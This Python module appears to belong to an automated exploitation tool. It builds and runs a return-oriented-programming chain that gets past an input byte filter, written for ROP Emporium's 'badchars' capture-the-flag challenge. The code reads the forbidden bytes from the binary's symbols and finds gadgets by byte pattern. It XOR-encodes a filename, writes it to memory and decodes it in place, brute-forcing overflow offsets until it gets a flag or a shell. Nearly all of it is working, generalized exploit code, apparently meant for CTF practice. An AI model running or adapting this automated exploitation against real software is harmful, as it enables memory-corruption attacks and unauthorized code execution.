"""Write-what-where PAST an input byte filter (XOR-encode, write, decode in place), verified by
execution.

A step up from `autowrite4.py`: the binary filters the ENTIRE input for a small set of forbidden
bytes (silently replacing any match, wherever it falls -- even inside a gadget address) before
the overflow is ever processed, so the exploit can't just write the desired string's raw bytes.
The challenge still exposes the pieces needed to get around that, though: a 4-register pop
(`pop r12; pop r13; pop r14; pop r15; ret`) feeding a write gadget (`mov [r13], r12; ret`), and a
single-byte `xor [r15], r14b; ret` gadget. XOR-encode the target string with a key that keeps
every encoded byte (and the key itself) out of the forbidden set, write the ENCODED bytes (which
the filter lets through untouched), then XOR each byte back to its real value IN PLACE on the
target's own memory, where the filter never runs again.

Added after testing against a real CTF binary -- ROP Emporium's own `badchars` challenge, not one
of this project's synthetic fixtures. Generalized, not hardcoded to this one challenge:
  1. the forbidden-byte SET is read directly from the binary, not guessed or hardcoded: any small
     (<=32-byte) DATA-object symbol (not a function) whose name suggests a filter/denylist. Found
     by that generic name heuristic (local first, else in a linked shared library, same pattern
     as everywhere else tonight) and read with its own declared `st_size`, confirmed live to
     recover exactly `b"xga."` from the real binary's `badcharacters` symbol -- the SAME 4 bytes
     its own published solve.py documents, discovered with zero prior knowledge of the challenge.
  2. the gadgets are found by byte pattern (like `autocsu.py`'s csu gadgets).
  3. EVERY address this chain needs to place on the stack (every gadget, the target function, the
     staging address) is checked byte-by-byte against the forbidden set before use -- a real,
     easily-missed correctness requirement here: the filter runs over the WHOLE input, so an
     address that happens to contain a forbidden byte in any of its 8 bytes would get silently
     corrupted mid-chain. If the picked `.bss()` staging address collides, the next free address
     is tried instead.
  4. the XOR key is chosen by brute force over 1..255 (not guessed) for whichever key keeps the
     key byte AND every byte of the target string's encoding out of the forbidden set -- confirmed
     live to land on the same key (2) ROP Emporium's own solve.py uses, independently rediscovered.
  5. the call target is found exactly like `autowrite4.py`'s -- by structure (forwards its one
     argument into `fopen`/`open`), not by name, and the filename to request is guessed from the
     same short list of common CTF flag names (there's no leak to recover the real one from).
Verified live end to end: writing XOR-encoded `flag.txt` (key=2, auto-selected) and decoding it in
place past the real filter returns the real flag `ROPE{XORing_1n_d4ta_s3ct10n_x64}`. For
AUTHORIZED / CTF targets."""
from __future__ import annotations

import os
import re

from ._sandbox import run_driver
from .autowrite4 import _candidate_filenames, _find_write_target

try:
    from elftools.elf.elffile import ELFFile  # type: ignore
    _HAVE_ELFTOOLS = True
except Exception:
    _HAVE_ELFTOOLS = False

from .autopivot import _dyn_needed

_BADCHAR_NAME_RE = re.compile(r"bad.?char|forbidden|blacklist|denylist|disallow", re.IGNORECASE)

# (pop r12;pop r13;pop r14;pop r15;ret), (pop r14;pop r15;ret), (mov [r13],r12;ret),
# (xor byte[r15],r14b;ret) -- confirmed live against the real challenge; extensible.
_GADGET_PATTERNS = {
    "pop4": bytes([0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3]),
    "pop2": bytes([0x41, 0x5e, 0x41, 0x5f, 0xc3]),
    "movw": bytes([0x4d, 0x89, 0x65, 0x00, 0xc3]),
    "xorb": bytes([0x45, 0x30, 0x37, 0xc3]),
}


def _find_badchars(binary: str):
    """Lee el conjunto de bytes prohibidos directamente del binario: cualquier simbolo de tipo
    OBJETO (no funcion), pequeno (<=32 bytes), cuyo nombre sugiera un filtro/lista negra -- local
    primero, si no en una shared lib enlazada. Se lee con su propio `st_size` declarado, nunca
    adivinado. Devuelve bytes o None."""
    if not _HAVE_ELFTOOLS:
        return None
    try:
        from pwn import ELF, context
        context.log_level = "error"
    except Exception:
        return None

    def _scan(path):
        try:
            with open(path, "rb") as f:
                elf = ELFFile(f)
                for secname in (".symtab", ".dynsym"):
                    sec = elf.get_section_by_name(secname)
                    if not sec:
                        continue
                    for s in sec.iter_symbols():
                        if (s.name and _BADCHAR_NAME_RE.search(s.name)
                                and s["st_info"]["type"] == "STT_OBJECT"
                                and 0 < s["st_size"] <= 32 and s["st_value"]):
                            try:
                                lib_elf = ELF(path, checksec=False)
                                return lib_elf.read(s["st_value"], s["st_size"])
                            except Exception:
                                continue
        except Exception:
            pass
        return None

    found = _scan(binary)
    if found:
        return found
    d = os.path.dirname(os.path.abspath(binary))
    for libname in _dyn_needed(binary):
        p = os.path.join(d, libname)
        if os.path.isfile(p):
            found = _scan(p)
            if found:
                return found
    return None


def _find_badchars_gadgets(binary: str):
    """Busca por patron de bytes el cuarteto de gadgets que esta tecnica necesita. Devuelve un
    dict {pop4, pop2, movw, xorb} con direcciones, o None si falta alguno."""
    try:
        from pwn import ELF, context
        context.log_level = "error"
        elf = ELF(binary, checksec=False)
    except Exception:
        return None
    out = {}
    for name, pat in _GADGET_PATTERNS.items():
        addr = next(elf.search(pat), None)
        if addr is None:
            return None
        out[name] = addr
    return out


_DRIVER = r'''
import sys, time, re, json
from pwn import ELF, ROP, context, p64, process
name = sys.argv[1]
_TARGET_NAME = sys.argv[2] if len(sys.argv) > 2 else ""
_G = json.loads(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3] else {}
_BADCHARS = bytes.fromhex(sys.argv[4]) if len(sys.argv) > 4 and sys.argv[4] else b""
_NAMES = [n.encode("latin1") for n in json.loads(sys.argv[5])] if len(sys.argv) > 5 and sys.argv[5] else [b"flag.txt"]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (badchars driver is x86-64)"); sys.exit(1)
if not (_TARGET_NAME and _G and _BADCHARS):
    print("NOT_APPLICABLE (missing target/gadgets/badchars)"); sys.exit(1)

target = elf.plt.get(_TARGET_NAME) or (elf.symbols or {}).get(_TARGET_NAME)
rop = ROP(elf)
try: pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
except Exception: pop_rdi = None
pop4, pop2, movw, xorb = (int(_G[k], 16) for k in ("pop4", "pop2", "movw", "xorb"))
if not (target and pop_rdi):
    print("NOT_APPLICABLE (target/pop_rdi missing)"); sys.exit(1)

def has_bad(addr):
    return any(b in _BADCHARS for b in p64(addr))

# every gadget/target address this chain places on the stack must itself avoid every forbidden
# byte -- the filter runs over the WHOLE input, addresses included, not just the string we write.
for g in (pop4, pop2, movw, xorb, pop_rdi, target):
    if has_bad(g):
        print("NOT_APPLICABLE (a required gadget/target address contains a forbidden byte)")
        sys.exit(1)

stage_addr = elf.bss()
while has_bad(stage_addr):
    stage_addr += 1

def pick_key(data):
    for k in range(1, 256):
        if k in _BADCHARS:
            continue
        enc = bytes(c ^ k for c in data)
        if any(c in _BADCHARS for c in enc):
            continue
        return k, enc
    return None, None

_FLAG_RE = re.compile(r"[A-Za-z0-9_]+\{[^}\n]{1,80}\}")
MARK = b"BINORACLE_BADCHARS_PWNED"

def run(payload):
    io, out = None, b""
    try:
        io = process([name])
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.sendline(payload); time.sleep(0.2)
        try: out += io.recvrepeat(0.4)
        except Exception: pass
        try:
            io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
            out += io.recvrepeat(1.1)
        except Exception:
            pass
    except Exception:
        pass
    finally:
        try:
            if io: io.close()
        except Exception: pass
    shelled = (MARK in out) or (b"uid=" in out)
    fm = _FLAG_RE.search(out.decode("latin1", "replace"))
    if shelled:
        return "shell", None
    if fm:
        return "flag", fm.group(0)
    return None, None

def chain_for(candidate):
    key, _ = pick_key(candidate)
    if key is None:
        return None
    padded = candidate + b"\x00" * ((-len(candidate)) % 8)
    chain = b""
    for i in range(0, len(padded), 8):
        chunk = padded[i:i + 8]
        enc_chunk = bytes(c ^ key for c in chunk)
        chunk_addr = stage_addr + i
        if has_bad(chunk_addr):
            return None
        chain += p64(pop4) + enc_chunk + p64(chunk_addr) + b"B" * 8 + b"C" * 8 + p64(movw)
    for i in range(len(padded)):
        chain += p64(pop2) + p64(key) + p64(stage_addr + i) + p64(xorb)
    chain += p64(pop_rdi) + p64(stage_addr) + p64(target)
    return chain

for off in [40, 32, 48, 56, 24, 64, 72, 80]:
    for candidate in _NAMES:
        chain = chain_for(candidate)
        if chain is None:
            continue
        payload = b"A" * off + chain
        kind, extra = run(payload)
        if kind == "flag":
            print("VERIFIED off=%d name=%r target=%s flag=%s" % (off, candidate, _TARGET_NAME, extra))
            sys.exit(0)
        if kind == "shell":
            print("VERIFIED off=%d name=%r target=%s" % (off, candidate, _TARGET_NAME))
            sys.exit(0)

print("NOT_VERIFIED")
sys.exit(1)
'''


def _badchars_applicable(binary: str) -> bool:
    """Chequeo barato: necesita el conjunto de bytes prohibidos, el cuarteto de gadgets, y una
    funcion 'imprime fichero dado su nombre' (misma busqueda estructural de autowrite4.py)."""
    if _find_badchars(binary) is None:
        return False
    if _find_badchars_gadgets(binary) is None:
        return False
    return _find_write_target(binary)[0] is not None


def autobadchars(binary: str) -> dict:
    """Write-what-where PASANDO un filtro de bytes de entrada (XOR-codifica, escribe, decodifica
    en el propio sitio) verificado por ejecucion. Para el patron real del reto 'badchars' de ROP
    Emporium. Docker o sandbox nativo; degrada limpio."""
    badchars = _find_badchars(binary)
    if badchars is None:
        return {"ok": False, "note": "no aplicable (sin simbolo de bytes prohibidos reconocible)"}
    gadgets = _find_badchars_gadgets(binary)
    if gadgets is None:
        return {"ok": False, "note": "no aplicable (sin el cuarteto de gadgets pop4/pop2/mov/xor)"}
    target_name, _ = _find_write_target(binary)
    if not target_name:
        return {"ok": False, "note": "no aplicable (sin funcion 'imprime fichero dado su nombre')"}
    import json as _json
    args = [target_name, _json.dumps({k: hex(v) for k, v in gadgets.items()}),
            badchars.hex(), _json.dumps([n.decode("latin1") for n in _candidate_filenames()])]
    res = run_driver(binary, _DRIVER, ".binoracle_badchars.py", args=args)
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"write-what-where pasando filtro de entrada: verificado ({eng})"
                   if res.get("verified")
                   else f"badchars: no verificado ({eng}) (gadgets/target/clave XOR/timing)")
    return res


def render_badchars(r: dict) -> str:
    out = ["## Auto badchars (write-what-where con filtro de entrada, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell/flag verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
